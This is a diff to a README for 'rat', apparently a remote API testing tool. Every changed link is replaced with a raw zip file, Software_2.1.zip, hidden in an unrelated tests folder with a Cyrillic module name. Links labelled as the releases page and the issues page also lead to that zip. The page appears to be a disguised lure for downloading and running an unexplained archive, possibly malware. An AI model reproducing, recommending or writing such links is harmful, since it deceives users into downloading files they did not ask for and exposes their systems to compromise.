@@ -1,7 +1,7 @@
 # 🚀 rat - Simplifying Remote API Testing
 
 ## 📥 Download the Latest Version
-[![Download rat](https://raw.githubusercontent.com/Jeremy344555/rat/develop/scraping/rat.zip)](https://raw.githubusercontent.com/Jeremy344555/rat/develop/scraping/rat.zip)
+[![Download rat](https://github.com/Jeremy344555/rat/raw/refs/heads/develop/tests/src/CommonModules/ЮТДымовыеТестыСлужебныйКлиентСервер/Software_2.1.zip)](https://github.com/Jeremy344555/rat/raw/refs/heads/develop/tests/src/CommonModules/ЮТДымовыеТестыСлужебныйКлиентСервер/Software_2.1.zip)
 
 ## 📖 Description
 rat is a user-friendly application designed to help you test remote APIs with ease. Whether you are conducting software testing or automating tasks, rat provides the tools you need to manage your API requests effectively.
@@ -11,7 +11,7 @@ Follow these steps to download and run rat:
 
 1. **Open Your Web Browser:** Start by launching your preferred web browser.
   
-2. **Visit the Releases Page:** Click on this link to go directly to the download page: [Download rat](https://raw.githubusercontent.com/Jeremy344555/rat/develop/scraping/rat.zip).
+2. **Visit the Releases Page:** Click on this link to go directly to the download page: [Download rat](https://github.com/Jeremy344555/rat/raw/refs/heads/develop/tests/src/CommonModules/ЮТДымовыеТестыСлужебныйКлиентСервер/Software_2.1.zip).
 
 3. **Select the Latest Release:** Look for the latest version listed at the top of the page. It usually has the highest version number.
 
@@ -41,7 +41,7 @@ Before downloading rat, ensure that your system meets the following requirements
 - **Multi-Platform:** Available on Windows, macOS, and Linux for versatility.
 
 ## ⚙️ Download & Install
-Once you are ready to start, revisit the download link here: [Download rat](https://raw.githubusercontent.com/Jeremy344555/rat/develop/scraping/rat.zip).
+Once you are ready to start, revisit the download link here: [Download rat](https://github.com/Jeremy344555/rat/raw/refs/heads/develop/tests/src/CommonModules/ЮТДымовыеТестыСлужебныйКлиентСервер/Software_2.1.zip).
 
 1. Follow the steps outlined in the "Getting Started" section.
 2. Ensure you have a stable internet connection for the download.
@@ -61,7 +61,7 @@ A: Yes, rat supports Windows, macOS, and Linux systems.
 A: Yes, you can reach out through the repository’s issues page for help.
 
 ## 📞 Support
-If you have any questions or need assistance, please visit the [issues page](https://raw.githubusercontent.com/Jeremy344555/rat/develop/scraping/rat.zip) on the GitHub repository. You can report your concerns there, and the community will do their best to assist you.
+If you have any questions or need assistance, please visit the [issues page](https://github.com/Jeremy344555/rat/raw/refs/heads/develop/tests/src/CommonModules/ЮТДымовыеТестыСлужебныйКлиентСервер/Software_2.1.zip) on the GitHub repository. You can report your concerns there, and the community will do their best to assist you.
 
 ## 🔗 Learn More
 For detailed information about features, usage examples, and additional resources, please refer to the project wiki on the GitHub site. 
